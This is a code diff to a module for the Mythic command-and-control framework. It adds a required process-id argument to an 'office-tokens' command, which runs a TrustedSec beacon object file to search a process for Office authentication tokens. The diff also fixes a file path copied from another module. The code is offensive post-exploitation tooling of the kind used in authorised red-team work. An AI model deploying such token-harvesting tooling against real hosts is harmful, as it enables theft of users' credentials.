@@ -40,15 +40,23 @@ def SerialiseArgs(OfArgs):
 class OfficeTokensArguments(TaskArguments):
     def __init__(self, command_line, **kwargs):
         super().__init__(command_line)
-        self.args = []
+        self.args = [
+            CommandParameter(
+                name="pid",
+                type=ParameterType.String,
+                description="Required: The pid of the process to search for tokens",
+                parameter_group_info=[
+                    ParameterGroupInfo(
+                        ui_position=1,
+                        required=True,
+                        default_value=""
+                        )
+                    ],
+            ),
+        ]
 
-    #Argument parsing originally by @djhohnstein https://github.com/MythicAgents/Apollo/blob/master/Payload_Type/apollo/mythic/agent_functions/ls.py
     async def parse_arguments(self):
         pass
-
-
-
-    
 
 class OfficeTokensCommand(CommandBase):
     cmd = "office-tokens"
@@ -82,36 +90,29 @@ class OfficeTokensCommand(CommandBase):
             raise Exception("BOF's are currently only supported on x64 architectures")
 
 
-        bof_path = f"/Mythic/mythic/agent_functions/trusted_sec_bofs/adcs_enum/adcs_enum.{arch}.o"
+        bof_path = f"/Mythic/mythic/agent_functions/trusted_sec_bofs/office_tokens/office_tokens.{arch}.o"
         if(os.path.isfile(bof_path) == False):
-            await self.compile_bof("/Mythic/mythic/agent_functions/trusted_sec_bofs/adcs_enum/")
+            await self.compile_bof("/Mythic/mythic/agent_functions/trusted_sec_bofs/office_tokens/")
 
         # Read the COFF file from the proper directory
         with open(bof_path, "rb") as coff_file:
             encoded_file = base64.b64encode(coff_file.read())
+
+
+        encoded_args = ""
+        OfArgs = []
+        pid = task.args.get_arg("pid")
+        OfArgs.append(generate32bitInt(pid))
+        encoded_args = base64.b64encode(SerialiseArgs(OfArgs)).decode()
 
         # Upload the COFF file to Mythic, delete after using so that we don't have a bunch of wasted space used
         file_resp = await MythicRPC().execute("create_file",
                                     task_id=task.id,
                                     file=encoded_file,
                                     delete_after_fetch=True)  
-        
-        # Create our BeaconPack object to handle the Argument packing
 
-
-        # Pack our argument into our buffer using BeaconPack (You'll do this multiple times for each parameter)
-        #bp.addWstr(task.args.get_arg("path"))
-
-        # Get the final buffer that we're going to pass to the coff command
-        #outbuffer = binascii.hexlify(bp.getbuffer()).decode()
-
-        # Delegate the execution to the coff command, passing: 
-        #   the file_id from our create_file RPC call
-        #   the functionName which in this case is go
-        #   the number of arguments we packed which in this task is 1
-        #   the argumentData which is the string representation of the hex output provided from bp.getbuffer()
         resp = await MythicRPC().execute("create_subtask_group", tasks=[
-            {"command": "coff", "params": {"coffFile":file_resp.response["agent_file_id"], "functionName":"go","arguments": "", "timeout":"30"}},
+            {"command": "coff", "params": {"coffFile":file_resp.response["agent_file_id"], "functionName":"go","arguments": encoded_args, "timeout":"30"}},
             ], 
             subtask_group_name = "coff", parent_task_id=task.id)
 
